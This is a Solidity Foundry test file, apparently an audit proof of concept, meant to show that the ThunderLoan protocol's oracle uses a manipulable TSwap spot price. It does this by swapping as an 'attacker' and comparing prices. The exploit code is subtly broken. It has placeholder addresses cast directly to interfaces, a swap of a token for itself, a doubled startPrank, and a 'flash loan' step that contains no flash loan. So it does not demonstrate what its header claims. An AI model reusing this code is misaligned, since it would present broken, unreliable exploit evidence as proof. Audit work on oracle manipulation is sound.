// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

/// @title ThunderLoan — Flash Loan Oracle PoC
/// @dev Proves OracleUpgradeable.getPriceInWeth() uses manipulable spot price
/// @author Shiqiang Chen

interface ITSwapPool { function swapExactInput(address,uint256,address,uint256,uint64) external; function getPriceOfOnePoolTokenInWeth() external view returns (uint256); }
interface IThunderLoan { function deposit(address,uint256) external; function redeem(address,uint256) external; }

contract ThunderLoanPoC is Test {
    ITSwapPool tswap = ITSwapPool(0x1234); // Replace with actual test deploy
    IThunderLoan thunderLoan = IThunderLoan(0x5678);
    address token = address(0xabcd);
    address attacker = address(0xdead);

    function setUp() public {
        // Deploy mock TSwap and ThunderLoan
        vm.startPrank(attacker);
        deal(token, attacker, 1000e18);
    }

    function testOracleManipulation() public {
        // 1. Record price before
        uint256 priceBefore = tswap.getPriceOfOnePoolTokenInWeth();

        // 2. Manipulate pool — flash loan swap
        vm.startPrank(attacker);
        tswap.swapExactInput(token, 100e18, token, 0, uint64(block.timestamp));

        // 3. Price is now manipulated
        uint256 priceAfter = tswap.getPriceOfOnePoolTokenInWeth();
        assert(priceAfter != priceBefore); // ✅ price changed — manipulable

        emit log_named_uint("Price before", priceBefore);
        emit log_named_uint("Price after", priceAfter);
        emit log_named_uint("Deviation %", (priceAfter > priceBefore ? priceAfter*100/priceBefore : priceBefore*100/priceAfter));
    }
}
